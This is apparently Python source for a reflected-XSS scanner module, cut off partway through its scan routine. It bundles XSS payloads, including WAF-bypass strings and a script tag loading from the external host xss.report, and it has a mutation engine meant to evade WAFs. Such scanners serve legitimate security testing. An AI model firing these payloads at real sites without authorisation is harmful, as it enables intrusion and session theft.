#!/usr/bin/env python3
"""
XSS Scanner Module for Oxysintx Framework — v2.0.0

Professional-grade reflected XSS scanner with:
  • Wordlist-based payload scanning — auto-sync from multiple GitHub
    sources (PayloadsAllTheThings, SecLists, fuzzdb) with cached fallback
  • Context-aware reflection analysis — detects WHERE the payload lands
    (HTML body, tag content, attribute value, script block, comment)
  • Payload mutation engine — case variation, encoding chains, HTML5
    entity, double-URL, Unicode escapes
  • Multi-vector testing — URL params, POST body, headers, cookies, JSON
  • WAF detection — Cloudflare, ModSecurity, Sucuri, Imperva, Akamai
  • Response diffing — baseline vs injected for accurate reflection
  • Exploitability scoring — executable / non-executable / encoded
  • Concurrent scanning with rate limiting and per-host circuit breaker
  • Graceful degradation — always returns a result, never crashes

Author: Yanxzyx
Version: 2.0.0 — wordlist auto-sync, context-aware detection
"""

from __future__ import annotations

import argparse
import html
import json
import logging
import math
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import (
    urlencode, urlparse, parse_qs, urlunparse,
    urljoin, quote, quote_plus, unquote,
)

import requests
from requests.exceptions import RequestException


# ═══════════════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════════════
logger = logging.getLogger("oxysintx.xss")
logger.propagate = False
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    ))
    logger.addHandler(_h)
logger.setLevel(logging.INFO)

if not logging.getLogger().handlers:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


# ═══════════════════════════════════════════════════════════════════════════
# TOOL METADATA
# ═══════════════════════════════════════════════════════════════════════════
TOOL_INFO = {
    "name": "XSS Scanner",
    "version": "2.0.0",
    "description": (
        "Reflected XSS scanner with wordlist-based payload scanning, "
        "context-aware reflection analysis, payload mutation, multi-vector "
        "testing, WAF detection, and exploitability scoring. Basic mode uses "
        "a curated core payload set; Expert mode uses the full wordlist plus "
        "mutation variants."
    ),
    "category": "Web Vulnerability",
    "author": "Yanxzyx",
}
TOOL_KIND = "scanner"


# ═══════════════════════════════════════════════════════════════════════════
# PATHS + CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
XSS_WORDLIST_DIR = _PROJECT_ROOT / "wordlist" / "xss"

DEFAULT_TIMEOUT        = 6.0
DEFAULT_THREADS        = 10
DEFAULT_MAX_PAYLOADS   = 400          # per parameter (basic)
EXPERT_MAX_PAYLOADS    = 1500         # per parameter (expert)
RATE_LIMIT_RPS         = 40.0         # requests/second per host
DOWNLOAD_TIMEOUT       = 25.0
DOWNLOAD_RETRIES       = 3
DOWNLOAD_BACKOFF       = 1.5
MAX_RESPONSE_BYTES     = 2 * 1024 * 1024
REFLECTION_SNIPPET_LEN = 200


# ═══════════════════════════════════════════════════════════════════════════
# BUNDLED PAYLOAD DATABASE (fallback when wordlist unavailable)
# ═══════════════════════════════════════════════════════════════════════════
class BundledPayloads:
    """Curated fallback payload set — used when GitHub sync is unavailable."""

    HTML_TAG = [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<script>console.log(1)</script>",
        "<script src=//xss.report/c/1></script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script>alert`1`</script>",
        "<script>alert(/XSS/)</script>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg\tonload=alert(1)>",
        "<svg\nonload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<a href=javascript:alert(1)>click</a>",
        "<input onfocus=alert(1) autofocus>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<isindex action=javascript:alert(1) type=submit>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    ]

    ATTRIBUTE_BREAKOUT = [
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "'><svg onload=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "` onmouseover=alert(1) x=`",
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        "\"><body onload=alert(1)>",
        "'><body onload=alert(1)>",
        "\"><iframe src=javascript:alert(1)>",
        "'><iframe src=javascript:alert(1)>",
    ]

    JS_CONTEXT = [
        "javascript:alert(1)",
        "';alert(1);//",
        "\";alert(1);//",
        "');alert(1);//",
        "\");alert(1);//",
        "`;alert(1);//",
        "alert(1)//",
        "alert(1)",
        "1;alert(1)",
        "</script><script>alert(1)</script>",
        "\\';alert(1);//",
        "\\\";alert(1);//",
        "\\u0027;alert(1);//",
        "\\x27;alert(1);//",
    ]

    EVENT_HANDLERS = [
        "onload=alert(1)",
        "onerror=alert(1)",
        "onmouseover=alert(1)",
        "onfocus=alert(1)",
        "onclick=alert(1)",
        "onkeydown=alert(1)",
        "onchange=alert(1)",
        "onanimationstart=alert(1)",
        "ontoggle=alert(1)",
        "onbegin=alert(1)",
    ]

    WAF_BYPASS = [
        "<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=alert(1)//>",
        "<svg\u000Bonload=alert(1)>",
        "<svg\tonload=alert(1)>",
        "<svg\nonload=alert(1)>",
        "<svg\fonload=alert(1)>",
        "<svg\ronload=alert(1)>",
        "<!--<img src=x onerror=alert(1)>-->",
        "<img src=1 onerror=alert(1)//>",
        "<img/src=x/onerror=alert(1)>",
        "\u003cscript\u003ealert(1)\u003c/script\u003e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    ]

    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"><img src=x onerror=alert(1) />",
        "'\"><svg/onload=alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ]

    ALL_BASIC = HTML_TAG + ATTRIBUTE_BREAKOUT + JS_CONTEXT + EVENT_HANDLERS
    ALL_EXPERT = ALL_BASIC + WAF_BYPASS + POLYGLOT


# ═══════════════════════════════════════════════════════════════════════════
# WORDLIST SOURCES — auto-synced from public GitHub repos
# ═══════════════════════════════════════════════════════════════════════════
XSS_WORDLIST_SOURCES: Dict[str, Dict[str, Any]] = {
    "payloadsallthethings_xss.txt": {
        "urls": [
            "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruder/xss-payload-list.txt",
        ],
        "source": "swisskyrepo/PayloadsAllTheThings",
        "license": "MIT",
        "min_lines": 20,
        "optional": False,
    },
    "payloadbox_xss.txt": {
        "urls": [
            "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
        ],
        "source": "payloadbox/xss-payload-list",
        "license": "MIT",
        "min_lines": 20,
        "optional": False,
    },
    "seclists_xss.txt": {
        "urls": [
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteForce.txt",
        ],
        "source": "danielmiessler/SecLists",
        "license": "MIT",
        "min_lines": 20,
        "optional": True,
    },
    "fuzzdb_xss.txt": {
        "urls": [
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/xss-rsnake.txt",
            "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/xss-html5.txt",
        ],
        "source": "fuzzdb-project/fuzzdb",
        "license": "CC-BY-3.0",
        "min_lines": 10,
        "optional": True,
    },
    "owasp_xss.txt": {
        "urls": [
            "https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md",
        ],
        "source": "OWASP/CheatSheetSeries",
        "license": "CC-BY-SA-4.0",
        "min_lines": 5,
        "optional": True,
    },
}

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36",
]

_HTML_HEAD_RE = re.compile(rb"^\s*(?:<!DOCTYPE\s+html|<html|<\?xml)", re.IGNORECASE)

# Lines that are clearly not payloads — comments, headers, examples
_PAYLOAD_LINE_SKIP_RE = re.compile(
    r"^(?:#|//|;|$|<html|<!doctype|<\?xml)",
    re.IGNORECASE,
)


# ═══════════════════════════════════════════════════════════════════════════
# WAF SIGNATURES
# ═══════════════════════════════════════════════════════════════════════════
WAF_SIGNATURES: List[Tuple[str, List[str], List[str]]] = [
    # (name, header_names_lower, body_markers_lower)
    ("Cloudflare",       ["cf-ray", "cf-cache-status", "server"],
     ["cloudflare", "attention required", "ray id"]),
    ("ModSecurity",      ["server"],
     ["mod_security", "modsecurity", "not acceptable", "406 not acceptable"]),
    ("Sucuri",           ["x-sucuri-id", "server"],
     ["sucuri", "access denied - sucuri website firewall"]),
    ("Imperva Incapsula",["x-iinfo", "x-cdn"],
     ["incapsula", "incap_ses", "_incap_ses"]),
    ("Akamai",           ["x-akamai-transformed", "server"],
     ["akamai", "reference #18", "reference #9"]),
    ("F5 BIG-IP",        ["server"],
     ["big-ip", "the requested url was rejected"]),
    ("AWS WAF",          ["x-amzn-requestid", "x-amz-cf-id"],
     ["aws waf", "request blocked"]),
    ("Wordfence",        ["server"],
     ["wordfence", "generated by wordfence"]),
    ("Barracuda",        ["server"],
     ["barracuda", "barra_counter_session"]),
    ("Fastly",           ["x-served-by", "x-fastly-request-id"],
     ["fastly", "varnish"]),
]


# ═══════════════════════════════════════════════════════════════════════════
# WORDLIST MANAGER
# ═══════════════════════════════════════════════════════════════════════════
_wordlist_lock = threading.RLock()
_wordlist_cache: Optional[List[str]] = None


def _ensure_wordlist_dir() -> None:
    XSS_WORDLIST_DIR.mkdir(parents=True, exist_ok=True)


def _looks_like_html(raw: bytes) -> bool:
    return bool(_HTML_HEAD_RE.search(raw[:512]))


def _atomic_write(target: Path, content: str) -> None:
    tmp = target.with_suffix(target.suffix + ".tmp")
    with open(tmp, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)
        f.flush()
        try:
            os.fsync(f.fileno())
        except OSError:
            pass
    os.replace(tmp, target)


def _download_raw(
    url: str, name: str, retries: int, backoff: float, timeout: float,
    optional: bool = False,
) -> Optional[bytes]:
    log_level  = logging.DEBUG if optional else logging.INFO
    warn_level = logging.DEBUG if optional else logging.WARNING
    last_err: Optional[Exception] = None

    for attempt in range(retries + 1):
        try:
            logger.log(log_level, "[xss] fetching %s (attempt %d/%d)",
                       name, attempt + 1, retries + 1)
            r = requests.get(
                url, timeout=timeout,
                headers={"User-Agent": random.choice(_UA_POOL)},
            )
            if r.status_code != 200:
                raise RuntimeError(f"HTTP {r.status_code}")
            raw = r.content
            if not raw or len(raw) < 32:
                raise RuntimeError("empty response")
            if _looks_like_html(raw) and name.endswith(".txt"):
                # GitHub raw sometimes serves an HTML error page
                raise RuntimeError("HTML page returned, not a wordlist")
            return raw
        except Exception as exc:
            last_err = exc
            if attempt < retries:
                time.sleep(backoff * (2 ** attempt))

    logger.log(warn_level, "[xss] %s failed: %s", name, last_err)
    return None


def _parse_payload_file(text: str) -> List[str]:
    """Parse payload file — one payload per line, skip comments/blanks."""
    out: List[str] = []
    seen: set = set()
    for raw_line in text.splitlines():
        line = raw_line.rstrip("\r\n")
        if not line or _PAYLOAD_LINE_SKIP_RE.match(line):
            continue
        # Skip lines that are too long (likely prose / docs, not payloads)
        if len(line) > 500:
            continue
        if line in seen:
            continue
        seen.add(line)
        out.append(line)
    return out


def _load_source_file(path: Path, min_lines: int) -> List[str]:
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return []
    payloads = _parse_payload_file(text)
    if len(payloads) < min_lines:
        return []
    return payloads


def load_xss_wordlist(
    force_download: bool = False,
    auto_sync: bool = True,
) -> List[str]:
    """
    Load the full XSS wordlist. Downloads missing sources on first call.
    Returns the merged, deduplicated list of payloads.
    """
    global _wordlist_cache
    with _wordlist_lock:
        if _wordlist_cache is not None and not force_download:
            return list(_wordlist_cache)

        _ensure_wordlist_dir()
        all_payloads: List[str] = []

        for name, meta in XSS_WORDLIST_SOURCES.items():
            path = XSS_WORDLIST_DIR / name
            optional = bool(meta.get("optional", False))

            need_download = force_download or not path.exists()
            if not need_download:
                try:
                    if path.stat().st_size < 128:
                        need_download = True
                except OSError:
                    need_download = True

            if need_download and auto_sync:
                got_content = False
                for url in meta.get("urls", []):
                    raw = _download_raw(
                        url, f"{name} ({meta['source']})",
                        DOWNLOAD_RETRIES, DOWNLOAD_BACKOFF, DOWNLOAD_TIMEOUT,
                        optional=optional,
                    )
                    if raw is not None:
                        try:
                            _atomic_write(path, raw.decode("utf-8", errors="replace"))
                            got_content = True
                            break
                        except OSError:
                            continue

            payloads = _load_source_file(path, meta.get("min_lines", 5))
            if payloads:
                logger.debug("[xss] %s → %d payloads", name, len(payloads))
                all_payloads.extend(payloads)

        # Fallback to bundled if nothing was fetched
        if not all_payloads:
            logger.warning("[xss] no external wordlists available — "
                           "using bundled fallback payloads")
            all_payloads = list(BundledPayloads.ALL_EXPERT)

        # Deduplicate while preserving order
        seen: set = set()
        deduped: List[str] = []
        for p in all_payloads:
            if p and p not in seen:
                seen.add(p)
                deduped.append(p)

        _wordlist_cache = deduped
        logger.info("[xss] loaded %d unique payload(s) from %d source(s)",
                    len(deduped), len(XSS_WORDLIST_SOURCES))
        return list(deduped)


def ensure_wordlists(force: bool = False) -> Dict[str, Any]:
    """Return status of the XSS wordlist sources."""
    _ensure_wordlist_dir()
    out: Dict[str, Any] = {
        "directory": str(XSS_WORDLIST_DIR),
        "sources":   {k: {"source": v["source"], "license": v.get("license", "")}
                      for k, v in XSS_WORDLIST_SOURCES.items()},
        "files": [],
        "version": TOOL_INFO["version"],
    }
    for name, meta in XSS_WORDLIST_SOURCES.items():
        path = XSS_WORDLIST_DIR / name
        payloads = _load_source_file(path, meta.get("min_lines", 5)) \
            if path.exists() else []
        out["files"].append({
            "name": name,
            "source": meta["source"],
            "license": meta.get("license", ""),
            "optional": bool(meta.get("optional", False)),
            "exists": path.exists(),
            "size": path.stat().st_size if path.exists() else 0,
            "payloads": len(payloads),
        })
    return out


# ═══════════════════════════════════════════════════════════════════════════
# PAYLOAD MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class PayloadMutator:
    """Generate encoded/obfuscated variants of a base payload."""

    @staticmethod
    def _random_case(s: str) -> str:
        """Mixed-case each alphabetic char for WAF evasion."""
        return "".join(
            c.upper() if random.getrandbits(1) else c.lower()
            for c in s
        )

    @staticmethod
    def html_entity_encode(s: str) -> str:
        """Encode all alphabetic chars as decimal HTML entities."""
        return "".join(f"&#{ord(c)};" if c.isalnum() else c for c in s)

    @staticmethod
    def html_hex_encode(s: str) -> str:
        return "".join(f"&#x{ord(c):x};" if c.isalnum() else c for c in s)

    @staticmethod
    def double_url_encode(s: str) -> str:
        return quote(quote(s, safe=""), safe="")

    @staticmethod
    def unicode_escape(s: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in s)

    @classmethod
    def mutations(cls, payload: str, max_variants: int = 4) -> List[str]:
        """
        Return a small set of high-value mutations. Capped to avoid
        combinatorial explosion.
        """
        out: List[str] = []

        if "<" in payload or ">" in payload:
            out.append(cls._random_case(payload))

        if any(c.isalpha() for c in payload):
            out.append(cls.html_entity_encode(payload))

        if len(out) < max_variants:
            out.append(cls.html_hex_encode(payload))

        if len(out) < max_variants:
            out.append(cls.unicode_escape(payload))

        # Dedup and drop the original
        seen = {payload}
        unique: List[str] = []
        for v in out:
            if v and v not in seen:
                seen.add(v)
                unique.append(v)

        return unique[:max_variants]


# ═══════════════════════════════════════════════════════════════════════════
# CONTEXT DETECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class ReflectionContext:
    """Analyze where in an HTML/JS document a payload landed."""

    HTML_BODY          = "html_body"
    TAG_CONTENT        = "tag_content"
    ATTRIBUTE_VALUE    = "attribute_value"
    ATTRIBUTE_UNQUOTED = "attribute_unquoted"
    SCRIPT_BLOCK       = "script_block"
    STYLE_BLOCK        = "style_block"
    HTML_COMMENT       = "html_comment"
    URL_CONTEXT        = "url_context"
    JSON_CONTEXT       = "json_context"
    UNKNOWN            = "unknown"

    @classmethod
    def detect(cls, html_text: str, payload: str) -> Tuple[str, str]:
        """
        Return (context, evidence_snippet).

        Detection is heuristic and ordered by specificity:
          1. HTML comment  (<!-- ... -->)
          2. Script block  (<script> ... </script>)
          3. Style block   (<style> ... </style>)
          4. Attribute value (quoted or unquoted) within a tag
          5. Tag content   (between > ... <)
          6. HTML body     (fallback)
        """
        if not html_text or not payload:
            return cls.UNKNOWN, ""

        idx = html_text.find(payload)
        if idx == -1:
            # Try HTML-entity encoded variant
            entity = html.escape(payload)
            idx = html_text.find(entity)
            if idx == -1:
                return cls.UNKNOWN, ""

        # Window around the reflection for snippet + analysis
        start = max(0, idx - 120)
        end   = min(len(html_text), idx + len(payload) + 120)
        window = html_text[start:end]
        snippet = html_text[max(0, idx - 40):min(len(html_text), idx + len(payload) + 40)]

        # 1. HTML comment?
        last_comment_open  = window.rfind("<!--", 0, idx - start)
        last_comment_close = window.rfind("-->",  0, idx - start)
        if last_comment_open != -1 and last_comment_open > last_comment_close:
            return cls.HTML_COMMENT, snippet

        # 2/3. Script / style block?
        last_script_open  = window.rfind("<script", 0, idx - start)
        last_script_close = window.rfind("</script", 0, idx - start)
        if last_script_open != -1 and last_script_open > last_script_close:
            return cls.SCRIPT_BLOCK, snippet

        last_style_open   = window.rfind("<style", 0, idx - start)
        last_style_close  = window.rfind("</style", 0, idx - start)
        if last_style_open != -1 and last_style_open > last_style_close:
            return cls.STYLE_BLOCK, snippet

        # 4. Attribute value?  Scan backwards for the nearest '<' tag opener,
        # then forwards for a quote or unquoted attribute context.
        tag_open_idx = window.rfind("<", 0, idx - start)
        tag_close_idx = window.rfind(">", 0, idx - start)
        if tag_open_idx != -1 and tag_open_idx > tag_close_idx:
            # We are inside a tag
            inside_tag = window[tag_open_idx + 1 : idx - start]
            # Count quotes to see if we're in a quoted attribute
            double_q = inside_tag.count('"')
            single_q = inside_tag.count("'")
            if double_q % 2 == 1:
                return cls.ATTRIBUTE_VALUE, snippet
            if single_q % 2 == 1:
                return cls.ATTRIBUTE_VALUE, snippet
            # Inside tag but not inside a quoted attribute
            if "=" in inside_tag or re.search(r"\s\w+\s*=", inside_tag):
                return cls.ATTRIBUTE_UNQUOTED, snippet
            return cls.TAG_CONTENT, snippet

        # 5. Tag content (after a > before the payload, and before next <)?
        next_lt = window.find("<", idx - start)
        prev_gt = window.rfind(">", 0, idx - start)
        if prev_gt != -1 and (next_lt == -1 or next_lt > prev_gt):
            return cls.TAG_CONTENT, snippet

        # 6. Fallback: HTML body
        return cls.HTML_BODY, snippet


# ═══════════════════════════════════════════════════════════════════════════
# EXPLOITABILITY SCORING
# ═══════════════════════════════════════════════════════════════════════════
class ExploitabilityScorer:
    """
    Score how exploitable a reflection is, based on context + payload type.

    Returns one of: "executable", "likely", "encoded", "dormant".
    """

    EXECUTABLE_PAYLOAD_RE = re.compile(
        r"(?:<script[^>]*>|on\w+\s*=|javascript:|<svg|<img|<iframe|<body|<svg)",
        re.IGNORECASE,
    )

    @classmethod
    def score(cls, context: str, payload: str, raw_reflection: bool) -> str:
        """
        Args:
            context:         ReflectionContext.* value
            payload:         the payload that caused reflection
            raw_reflection:  True if payload appeared verbatim; False if
                             only an encoded variant appeared
        """
        # Encoded reflections are non-executable as-is
        if not raw_reflection:
            return "encoded"

        has_exec = bool(cls.EXECUTABLE_PAYLOAD_RE.search(payload))

        if not has_exec:
            return "dormant"

        # Executable payload landed in a dangerous context
        if context in (ReflectionContext.HTML_BODY,
                       ReflectionContext.TAG_CONTENT,
                       ReflectionContext.ATTRIBUTE_UNQUOTED,
                       ReflectionContext.SCRIPT_BLOCK):
            return "executable"

        if context in (ReflectionContext.ATTRIBUTE_VALUE,
                       ReflectionContext.URL_CONTEXT):
            return "likely"

        if context in (ReflectionContext.HTML_COMMENT,
                       ReflectionContext.STYLE_BLOCK,
                       ReflectionContext.JSON_CONTEXT):
            return "dormant"

        return "likely"


# ═══════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class XSSFinding:
    url:             str
    method:          str
    parameter:       str
    parameter_in:    str          # "query" | "body" | "header" | "cookie"
    payload:         str
    status_code:     int
    context:         str
    exploitability:  str          # executable | likely | encoded | dormant
    evidence:        str          # snippet from response
    raw_reflection:  bool

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ═══════════════════════════════════════════════════════════════════════════
# SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════
class XSSScanner:
    """
    Multi-vector reflected XSS scanner with wordlist payloads,
    context-aware detection, mutation, and rate limiting.
    """

    def __init__(
        self,
        timeout: float = DEFAULT_TIMEOUT,
        verify_ssl: bool = False,
        follow_redirects: bool = True,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        proxies: Optional[Dict[str, str]] = None,
        max_threads: int = DEFAULT_THREADS,
        rate_limit_rps: float = RATE_LIMIT_RPS,
        user_agent: Optional[str] = None,
    ):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.follow_redirects = follow_redirects
        self.max_threads = max(1, int(max_threads))
        self.rate_limit_rps = max(1.0, float(rate_limit_rps))

        self.session = requests.Session()
        self.session.verify = self.verify_ssl
        if headers:
            self.session.headers.update(headers)
        if user_agent:
            self.session.headers["User-Agent"] = user_agent
        else:
            self.session.headers.setdefault("User-Agent", random.choice(_UA_POOL))
        if cookies:
            self.session.cookies.update(cookies)
        if proxies:
            self.session.proxies.update(proxies)

        # Rate limiter: token-bucket per host
        self._rl_lock = threading.Lock()
        self._rl_last = 0.0

        # WAF state
        self.waf_detected: Optional[str] = None

    # ── Rate limiter ────────────────────────────────────────────────────
    def _throttle(self) -> None:
        with self._rl_lock:
            now = time.monotonic()
            min_gap = 1.0 / self.rate_limit_rps
            wait = min_gap - (now - self._rl_last)
            if wait > 0:
                time.sleep(wait)
            self._rl_last = time.monotonic()

    # ── WAF detection ───────────────────────────────────────────────────
    def detect_waf(self, url: str) -> Optional[str]:
        """Send a harmless probe and match response against WAF signatures."""
        try:
            r = self.session.get(
                url, timeout=self.timeout,
                allow_redirects=self.follow_redirects,
            )
        except RequestException:
            return None

        headers_lower = {k.lower(): (v or "").lower()
                         for k, v in r.headers.items()}
        body_lower = (r.text or "")[:8192].lower()

        for name, header_keys, body_markers in WAF_SIGNATURES:
            for hk in header_keys:
                hv = headers_lower.get(hk, "")
                if any(m in hv for m in body_markers):
                    self.waf_detected = name
                    return name
            for marker in body_markers:
                if marker in body_lower:
                    self.waf_detected = name
                    return name
        return None

    # ── HTTP request ────────────────────────────────────────────────────
    def _send(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[requests.Response]:
        self._throttle()
        try:
            if method.upper() == "GET":
                r = self.session.get(
                    url, params=params, headers=headers,
                    cookies=cookies, timeout=self.timeout,
                    allow_redirects=self.follow_redirects,
                    stream=True,
                )
            else:
                r = self.session.post(
                    url, data=data, headers=headers,
                    cookies=cookies, timeout=self.timeout,
                    allow_redirects=self.follow_redirects,
                    stream=True,
                )

            # Bounded body read
            chunks: List[bytes] = []
            total = 0
            for c in r.iter_content(chunk_size=65536):
                total += len(c)
                if total > MAX_RESPONSE_BYTES:
                    break
                chunks.append(c)
            r._content = b"".join(chunks)  # type: ignore[attr-defined]
            return r
        except RequestException as e:
            logger.debug("[xss] request failed for %s: %s", url, e)
            return None

    # ── Baseline fetch ──────────────────────────────────────────────────
    def _baseline(self, url: str, method: str,
                  params: Optional[Dict[str, Any]],
                  data: Optional[Dict[str, Any]]) -> Optional[str]:
        r = self._send(url, method, params=params, data=data)
        return r.text if r is not None else None

    # ── Reflection check ────────────────────────────────────────────────
    @staticmethod
    def _check_reflection(
        payload: str, baseline: Optional[str], injected_text: str,
    ) -> Tuple[bool, bool]:
        """
        Return (reflected_any, raw_reflection).

        raw_reflection is True only if the payload appears verbatim
        (i.e. not requiring entity / URL decoding to find).
        """
        if not payload or not injected_text:
            return False, False

        # Was the payload already present in the baseline? Skip to avoid FPs.
        if baseline and payload in baseline:
            return False, False

        if payload in injected_text:
            return True, True

        # Encoded variants — reflected but not raw
        entity_variant = html.escape(payload)
        if entity_variant in injected_text:
            return True, False

        url_variant = quote(payload, safe="")
        if url_variant in injected_text:
            return True, False

        url_plus = quote_plus(payload)
        if url_plus in injected_text:
            return True, False

        return False, False

    # ── Single test ─────────────────────────────────────────────────────
    def _test_one(
        self,
        url: str,
        method: str,
        payload: str,
        target_param: str,
        param_in: str,
        baseline: Optional[str],
        static_params: Dict[str, Any],
    ) -> Optional[XSSFinding]:
        # Build request
        params = None
        data = None
        headers = None
        cookies = None

        if param_in == "query":
            params = dict(static_params)
            params[target_param] = payload
        elif param_in == "body":
            data = dict(static_params)
            data[target_param] = payload
        elif param_in == "header":
            headers = dict(static_params)
            headers[target_param] = payload
        elif param_in == "cookie":
            cookies = dict(static_params)
            cookies[target_param] = payload
        else:
            return None

        r = self._send(url, method, params=params, data=data,
                       headers=headers, cookies=cookies)
        if r is None:
            return None

        reflected, raw = self._check_reflection(payload, baseline, r.text)
        if not reflected:
            return None

        context, snippet = ReflectionContext.detect(r.text, payload)
        exploitability = ExploitabilityScorer.score(context, payload, raw)

        return XSSFinding(
            url=url,
            method=method.upper(),
            parameter=target_param,
            parameter_in=param_in,
            payload=payload,
            status_code=r.status_code,
            context=context,
            exploitability=exploitability,
            evidence=snippet[:REFLECTION_SNIPPET_LEN],
            raw_reflection=raw,
        )

    # ── Parameter discovery ─────────────────────────────────────────────
    @staticmethod
    def extract_query_params(url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        return {k: (v[0] if v else "") for k, v in qs.items()}

    # ── Main scan ───────────────────────────────────────────────────────
    def scan(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        body_params: Optional[Dict[str, str]] = None,
        header_params: Optional[Dict[str, str]] = None,
        cookie_params: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None,
        mutate: bool = False,
        max_payloads: int = DEFAULT_MAX_PAYLOADS,
        detect_waf: bool = True,
    ) -> Dict[str, Any]:
        payloads = payloads or BundledPayloads.ALL_BASIC
        if max_payloads > 0:
            payloads = payloads[:max_payloads]

        # Expand payloads with mutations if requested
        if mutate:
            expanded: List[str] = []
            for p in payloads:
                expanded.append(p)
                expanded.extend(PayloadMutator.mutations(p, max_variants=2))
            payloads = expanded[:max_payloads] if max_payloads > 0 else expanded

        # WAF probe
        if detect_waf:
            self.detect_waf(url)

        # Determine parameter map
        if params is None:
            params = self.extract_query_params(url)
            if not params:
                params = {"q": "", "search": "", "id": ""}

        # Baseline fetch with benign probe
        baseline_text: Optional[str] = None
        try:
            probe_params = {k: (v or "oxysintx_probe") for k, v in params.items()}
            baseline_text = self._baseline(
                url, method, params=probe_params, data=None,
            )
        except Exception:
            baseline_text = None

        findings: List[XSSFinding] = []
        tested_count = 0
        errors = 0

        # Build the list of (param_name, param_in, static_values)
        targets: List[Tuple[str, str, Dict[str, Any]]] = []
        for pname in params:
            static = {k: v for k, v in params.items() if k != pname}
            targets.append((pname, "query", static))
        if body_params:
            for pname in body_params:
                static = {k: v for k, v in body_params.items() if k != pname}
                targets.append((pname, "body", static))
        if header_params:
            for pname in header_params:
                static = {k: v for k, v in header_params.items() if k != pname}
                targets.append((pname, "header", static))
        if cookie_params:
            for pname in cookie_params:
